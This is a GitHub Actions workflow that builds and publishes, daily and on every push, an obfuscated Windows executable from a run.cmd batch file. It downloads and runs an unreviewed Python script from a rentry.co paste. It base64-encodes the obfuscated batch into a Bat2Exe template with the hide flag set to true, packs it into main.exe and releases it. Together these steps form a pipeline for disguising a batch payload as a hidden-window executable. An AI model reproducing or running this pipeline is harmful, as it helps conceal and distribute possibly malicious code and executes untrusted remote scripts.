name: Obfuscate File and Upload Exe

on:
  push:
    paths:
      - 'run.cmd'
  schedule:
    - cron: '0 0 * * *'  # Runs every day at midnight UTC
  workflow_dispatch:  # Allows manual triggering

jobs:
  obfuscate:
    runs-on: windows-latest
    permissions:
      contents: write
      pull-requests: write
      repository-projects: write
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Download main.py
        run: |
          Invoke-WebRequest -Uri https://rentry.co/rbbydedw/raw -OutFile main.py

      - name: Obfuscate run.cmd
        run: |
          python main.py

      - name: Base64 Encode run-obf.bat
        id: base64_encode
        run: |
          $base64Encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes('run-obf.bat'))
          [IO.File]::WriteAllText('encoded.b64', $base64Encoded)

      - name: Download and Modify template.js
        run: |
          Invoke-WebRequest -Uri https://raw.githubusercontent.com/KDot227/Bat2Exe/main/src/to_compile/static/template.js -OutFile template.js
          (Get-Content template.js) -replace 'const hide = false;', 'const hide = true;' | 
          (Get-Content) -replace 'BASE64ENCODEDSTUFFHERE', (Get-Content encoded.b64) | 
          Set-Content modified.js

      - name: Install Node.js and Required Packages
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          
      - name: Install pkg
        run: |
          npm install -g pkg

      - name: Obfuscate JavaScript File
        run: |
          pkg modified.js --compress GZip -t node18-win

      - name: Delete-tag-and-release
        uses: dev-drprasad/delete-tag-and-release@v1.1
        with:
          tag_name: AutoBuildExe
          delete_release: true
          github_token: ${{ secrets.GITHUB_TOKEN }}

      - name: Create Release
        id: create_release
        uses: actions/create-release@latest
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: AutoBuildExe
          release_name: AutoBuildExe
          body: Obfuscated run.cmd file
          draft: false
          prerelease: false

      - name: Upload Release Asset
        id: upload-release-asset 
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }}
          asset_path: modified.exe
          asset_name: main.exe
          asset_content_type: application/octet-stream
